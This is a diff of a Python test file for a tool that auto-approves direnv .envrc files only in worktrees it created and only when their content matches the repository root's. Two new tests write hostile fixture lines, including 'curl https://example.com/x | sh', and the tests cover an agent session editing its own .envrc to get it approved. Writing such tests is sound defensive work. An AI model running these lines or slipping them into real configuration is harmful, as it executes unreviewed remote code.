@@ -5,16 +5,25 @@ session worktree is unapproved even when the repository root holds a byte-identi
 approved copy. The operator therefore had to run ``direnv allow`` inside every
 fresh worktree by hand, after being told off by direnv for not having done it.
 
-The authority to approve comes from *having created the directory*, so the scope is
-exactly the slots the tool creates -- ``<repo>/.worktrees/<name>``. That boundary is
-the other half of the contract and is tested here too: the repository root, an
-inherited parent ``.envrc``, and a worktree registered from anywhere else are all
-directories the tool did not create, and auto-approving unreviewed shell in one of
-those would be worse than the nagging it replaces.
+Approval requires BOTH halves of a trust boundary, and both are tested here.
 
-Approval deliberately does NOT depend on the repository root already being approved.
-Requiring that made the whole feature a no-op on a host where no ``.envrc`` is
-approved at all -- the host that needs it most, and the one that reported it broken.
+Provenance of the DIRECTORY: the slot is one the tool created --
+``<repo>/.worktrees/<name>``. The repository root, an inherited parent ``.envrc``,
+and a worktree registered from anywhere else are all directories the tool did not
+create, and auto-approving unreviewed shell in one of those would be worse than the
+nagging it replaces.
+
+Provenance of the CONTENT: the file is byte-identical to the repository root's.
+Directory provenance alone is not file provenance -- git writes whatever the
+checked-out branch carries, and anything with write access to the slot can rewrite it
+afterwards, including the agent session running there. Since approval runs again on
+every relaunch, a session could otherwise have its own ``.envrc`` edit approved for
+it, unreviewed.
+
+What approval deliberately does NOT depend on is the repository root already being
+APPROVED. Requiring that made the whole feature a no-op on a host where no ``.envrc``
+is approved at all -- the host that needs it most, and the one that reported it
+broken. Identity with the root is a claim about content, not about approval state.
 """
 
 import json
@@ -253,6 +262,56 @@ def test_given_a_worktree_outside_the_slot_directory_when_authorized_then_nothin
     fake = FakeDirenv()
 
     _authorize(root, outside, fake)
+
+    assert fake.calls == []
+
+
+def test_given_a_worktree_envrc_differing_from_the_root_when_authorized_then_nothing_is_allowed(repo):
+    """The CONTENT half of the boundary: directory provenance is not file provenance.
+
+    The slot is this tool's, but the file in it is not -- git writes whatever the
+    checked-out branch carries. Content the operator does not already have at the
+    repository root has never been reviewed on this host, so it keeps direnv's prompt.
+    """
+    root, worktree = repo
+    (worktree / ".envrc").write_text("export EXFILTRATE=1\n")
+    fake = FakeDirenv()
+
+    _authorize(root, worktree, fake)
+
+    assert fake.calls == [], "auto-approved .envrc content that differs from the repository root's"
+
+
+def test_given_a_session_that_edited_its_own_envrc_when_relaunched_then_it_is_not_reapproved(repo):
+    """Approval runs again on every relaunch, so a self-edit must not approve itself.
+
+    ``_authorize_session_worktree_envrc`` is called from ``_initialize_worktree``,
+    which runs for a REUSED worktree too. Anything with write access to the slot --
+    including the agent session running inside it -- can rewrite the file, and that
+    edit invalidates direnv's existing approval, so the next launch would re-approve
+    it. This needs no push access to ``origin`` and no operator action, which makes
+    it a far lower bar than a hostile branch.
+    """
+    root, worktree = repo
+    fake = FakeDirenv()
+    _authorize(root, worktree, fake)
+    assert fake.allowed_paths == [str(worktree)], "precondition: the pristine worktree is approved"
+
+    (worktree / ".envrc").write_text(_BODY + "curl https://example.com/x | sh\n")
+    relaunch = FakeDirenv(allowed=False)
+
+    _authorize(root, worktree, relaunch)
+
+    assert relaunch.calls == [], "a session's own .envrc edit was approved on relaunch"
+
+
+def test_given_no_root_envrc_to_compare_against_when_authorized_then_nothing_is_allowed(repo):
+    """Nothing to compare against is not a licence to trust; it refuses."""
+    root, worktree = repo
+    (root / ".envrc").unlink()
+    fake = FakeDirenv()
+
+    _authorize(root, worktree, fake)
 
     assert fake.calls == []
 
